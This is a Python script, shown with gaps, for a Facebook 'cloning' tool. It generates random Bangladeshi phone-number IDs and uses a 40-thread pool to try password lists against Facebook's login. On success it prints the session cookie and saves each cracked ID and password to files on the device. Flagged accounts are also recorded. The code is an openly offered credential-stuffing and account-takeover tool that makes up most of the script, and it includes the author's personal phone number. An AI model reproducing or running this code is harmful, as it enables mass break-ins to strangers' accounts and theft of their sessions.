#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
#Sc Make By ALAMGIR HOSEN
#ALAMGIR By BANGLADESH HOKAR POTTI
#Github 
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
#••••••••••••••••••••••••IMPORT MODULE•••••••••••••••••••••••#
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
...
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m CREATED BY\33[32;m   : ALAMGIR HOSEN SAGOR \033[1;96m 
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m FACEBOK      : ALAMGIR HOSEN SAGOR\033[1;34m
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m GITHUB       : BANGLADESH HOKER POTTY \033[1;35m      
     ...
     \033[1;31m[\033[1;32m•\033[1;31m]\33[1;32m TOOL VIRSION : \033[1;36m8.4                 
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]""") 
cloninglogo =("""
  \33[1;91m
\033[97;1m   ___    __    ___    __  _________________ 
...
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║\033[1;95mOwner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mALAMGIR \033[1;90m<\033[1;92m•\033[1;90m] \033[1;95mV-01\033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)
contactinfo = (""" 
  \33[1;91m
...
\033[1;31m[\033[1;32m+\033[1;31m]\033[1;93m═════════════════════════════════════════════════\033[1;31m[\033[1;32m+\033[1;31m]
 \033[1;97m╔══════════════════════════════════════╗   
 \033[1;97m║   \033[1;95m Owner \033[1;90m<\033[1;92m•\033[1;90m> \033[1;93mALAMGIR     \033[1;97m║
 \033[1;97m╚══════════════════════════════════════╝
                         """)
def Cloning_Linex():
...
def Priya_ALAMGIR():
    ...
    os.system('clear');print(logo);print("  \033[1;35m[\033[1;32m1\033[1;35m]\033[1;32m BD RANDOM \033[1;35m[\033[1;32m2\033[1;35m]\033[1;32m MY CONTACT INFO \033[1;35m[\033[1;32m0\033[1;35m]\033[1;32m CLOSED TOOLS");Al_ALAMGIR();Tahrima = input(f'  \033[1;91m[\033[1;97m?\033[1;91m]\033[1;32m CHOICE YOUR OPTION :\033[1;36m ')
    if Tahrima in ["1","A","a"]:
        Priya()
    if Tahrima in ["2","B","b"]:
        Contact()
    if Tahrima in ["0","E","e"]:
    	...
    	print("  \033[1;35m[\033[1;32m×\033[1;35m]\033[1;32m Worning Typ");Priya_ALAMGIR()
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
#••••••••••••••••••••••CONTACT INFO•••••••••••••••••••••••••••#
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
def Contact():
	...
	if Tymin in ['5']:
		os.system('xdg-open https://www.facebook.com/Normal.User.Alamgir')
	if Tymin in ['6']:
		os.system('xdg-open wa.me/+8801712034753')
	if Tymin in ['7']:
		os.system('xdg-open https://www.facebook.com/Normal.User.Alamgir')
	if Tymin in ['8']:
		os.system('xdg-open https://www.facebook.com/Normal.User.Alamgir')
...
#•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••#
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with ThreadPool(max_workers=40) as ALAMGIR_Asha:
        os.system('clear')
        print(cloninglogo)
        Contact_Linex()
        tl = str(len(user))
        ...
        for love in user:
            ...
            uid = code+love
            if 'M1' in nabil:
            	ALAMGIR_Asha.submit(Asraful1,uid,pwx,tl)
            elif 'M2' in nabil:
            	ALAMGIR_Asha.submit(Asraful2,uid,pwx,tl)
            elif 'M3' in nabil:
            	ALAMGIR_Asha.submit(Asraful3,uid,pwx,tl)
            elif 'M4' in nabil:
            	ALAMGIR_Asha.submit(Asraful4,uid,pwx,tl)
            elif 'M5' in nabil:
            	ALAMGIR_Asha.submit(Asraful5,uid,pwx,tl)
            else:
            	ALAMGIR_Asha.submit(Asraful1,uid,pwx,tl)
#•••••••••••••••••••••••••M-UPDATE M1••••••••••••••••••••••••••#
#••••••••••••••••••••SCRIPT MATHOID M1•••••••••••••••••••••#
...
def Asraful1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mALAMGIR-M1\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            ashaALAMGIR = random.choice(bangla)
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mALAMGIR-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;32m'+coki);open('/sdcard/ALAMGIR-OK-M1.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('  \033[1;90m[ALAMGIR-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/ALAMGIR-CP-M1.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
...
def Asraful2(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mALAMGIR-M2\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            ALAMGIRasha = random.choice(ugen)
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mALAMGIR-OᏦ\033[1;96m]\033[1;93m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;91m'+coki);open('/sdcard/ALAMGIR-OK-M2.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[ALAMGIR-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/ALAMGIR-CP-M2.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
...
def Asraful3(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mALAMGIR-M3\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            ALAMGIRasha = random.choice(ugen)
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mALAMGIR-OᏦ\033[1;96m]\033[1;97m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;93mCOOKIE : \033[1;95m'+coki);open('/sdcard/ALAMGIR-OK-M3.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[ALAMGIR-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/ALAMGIR-CP-M3.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
...
def Asraful4(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mALAMGIR-M4\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            ALAMGIRasha = random.choice(ugen)
            free_fb = session.get('https://p.facebook.com').text
            log_data = {
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mALAMGIR-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');open('/sdcard/ALAMGIR-OK-M4.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[ALAMGIR-ᏟᏢ] '+uid+' | '+ps+' \n');open('/sdcard/ALAMGIR-CP-M4.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
...
def Asraful5(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r  \033[1;91m[\033[1;92mALAMGIR-M5\033[1;91m]<>[\033[1;92m%s\033[1;91m]<>[\033[1;92mOK-%s\033[1;91m]\r'%(loop,len(oks))),
            sys.stdout.flush()
            ashaALAMGIR = random.choice(bangla)
            ...
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print(f'  \033[1;96m[\033[1;92mALAMGIR-OᏦ\033[1;96m]\033[1;92m '+uid+' \033[1;96m|\033[1;92m '+ps+'');print(f'  \033[1;32mCOOKIE : \033[1;97m'+coki);open('/sdcard/ALAMGIR-OK-M5.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('  \033[1;90m[ALAMGIR-ᏟᏢ] '+uid+' | '+ps+' \n')open('/sdcard/ALAMGIR-CP-M5.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
